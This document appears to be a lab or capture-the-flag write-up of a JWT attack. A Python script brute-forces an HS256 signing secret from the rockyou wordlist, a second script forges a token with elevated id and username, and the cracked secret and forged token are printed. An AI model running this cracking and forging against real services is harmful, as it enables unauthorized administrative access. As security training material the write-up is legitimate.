# JWT Cracking and Privilege Escalation Write-up

## Executive Summary
This report documents the successful exploitation of a JSON Web Token (JWT) vulnerability, resulting in privilege escalation to administrative access. By cracking the JWT secret key and forging a modified token, we were able to manipulate user identity parameters to gain elevated permissions.

## Target JWT
```
eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MTcsInVzZXJuYW1lIjoiYWRtaW4iLCJjb2RlbmFtZSI6ImFkbWluIiwiaWF0IjoxNzQ2OTQ0Mzk5LCJleHAiOjE3NDcwMzA3OTl9.Meiri0srFara5igrbNl8ibFyeYXqkeemtM3XFNi932Q
```

## Methodology

### 1. JWT Analysis

First, we decoded the JWT structure to understand its components:

**Header:**
```json
{
  "alg": "HS256"
}
```

**Original Payload:**
```json
{
  "id": 17,
  "username": "admin",
  "codename": "admin",
  "iat": 1746944399,
  "exp": 1747030799
}
```

### 2. Secret Key Cracking

The JWT used HMAC-SHA256 (HS256) for signature verification, which relies on a secret key. We employed a dictionary attack using the following approach:

1. Extracted the header and payload from the JWT
2. Made a script to bruteforce if the key belongs to rockyou.txt

```python
──(venv)(shub㉿LAPTOP-O18S4BQL)-[~/work/tools]
└─$ cat new2.py
import jwt
from jwt.exceptions import InvalidSignatureError

# JWT token to crack
token = "eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MTcsInVzZXJuYW1lIjoiYWRtaW4yIiwiY29kZW5hbWUiOiJhZG1pbjIiLCJpYXQiOjE3NDY5NDc3MDAsImV4cCI6MTc0NzAzNDEwMH0.DcW6n6DJ7uuT_D95gv1iIwpSACMwxfoJ5_j9wnRNtmk"

# Split header and payload
header = jwt.get_unverified_header(token)
algo = header['alg']

print(f"[*] Algorithm: {algo}")

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        secret = line.strip()
        try:
            jwt.decode(token, secret, algorithms=[algo])
            print(f"[+] Secret found: {secret}")
            break
        except InvalidSignatureError:
            continue
        except Exception as e:
            print(f"[-] Error: {e}")
            continue
```
            

**Secret Key Discovery:** `1littlesecret`

### 3. Payload Modification for Privilege Escalation

We identified that modifying the following fields would grant administrative access:
- `id`: Change from `17` to `0` (root/superuser ID)
- `username`: Change from `admin` to `administrator` (system admin account)

**Modified Payload:**
```json
{
  "id": 0,
  "username": "administrator",
  "codename": "administrator",
  "iat": 1746944399,
  "exp": 1747030799
}
```

### 4. JWT Forging

Using the discovered secret key, we generated a new JWT with the modified payload:

```python
import jwt

# Modified payload with elevated privileges
payload = {
    "id": 0,
    "username": "administrator",
    "codename": "administrator",
    "iat": 1746944399,
    "exp": 1747030799
}

# Generate new JWT using the cracked secret
forged_token = jwt.encode(payload, "1littlesecret", algorithm="HS256")
print(forged_token)
```

## Results

### Forged JWT
```
eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MCwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIiwiY29kZW5hbWUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzQ2OTQ0Mzk5LCJleHAiOjE3NDcwMzA3OTl9.QH_Xm91_sL_KQs-h60XUzGU4sZzQe1OdFVa0j_W0U3A
```

This forged JWT, when applied to the Authentication header (`Authorization: Bearer [JWT]`), successfully granted administrative access to protected resources.
